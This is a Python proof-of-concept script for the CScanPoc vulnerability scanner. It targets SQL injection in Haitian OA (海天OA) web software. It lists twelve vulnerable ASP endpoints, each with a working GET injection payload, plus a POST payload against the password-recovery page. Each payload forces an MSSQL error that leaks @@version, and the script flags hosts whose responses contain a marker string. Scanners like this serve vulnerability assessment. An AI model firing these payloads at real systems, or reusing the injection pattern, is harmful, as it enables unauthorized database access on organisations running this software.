# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'haitianoa_0006' # 平台漏洞编号，留空
    name = '海天OA系统存在SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-02-11'  # 漏洞公布时间
    desc = '''s
        海天OA系统存在SQL注入漏洞.
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=082899' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '海天OA'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'haitianoa_0006' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            #GET型
            urls = [
                arg + '/PowerSelect.asp?FieldValue=1%27%20and%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version%20and%20%271%27=%271',
                arg + '/Documents/FolderInfor.asp?POAID=1%27%20and%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version%20and%20%271%27=%271',
                arg + '/Include/ChaXunDetail.asp?FID=-233%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
                arg + '/portal/index.asp?id=-233%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version&returndata=true%20id=1',
                arg + '/information/OA_Condition.asp?subclass=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
                arg + '/Documents/FolderInfor.asp?OAID=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
                arg + '/meetingroom/MeetingRoom_UseInfo.asp?MeetingRoom=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
                arg + '/ZhuanTi/FolderDetails.asp?OAID=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
                arg + '/include/user/treedata.asp?bumenid=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version--',
                arg + '/car/ShenQingInforDis.asp?OAID=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
                arg + '/flow/BiaoDanDangAn.asp?BiaoDanID=1%27%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version--',
                arg + '/VO_EmailCaoGao.asp?StartDate=1%27)%20or%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version%20)--',
            ]
            for url in urls:
                code, head, res, err, _ = hh.http(url)
                if ((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
            #POST型
            content_type = 'Content-Type: application/x-www-form-urlencoded'
            url = arg + '/LosePassAction.asp'
            data = 'username=123\'%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--&Remark=123'
            code, head, res, err, _ = hh.http(url, post=data, header=content_type)
            if((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()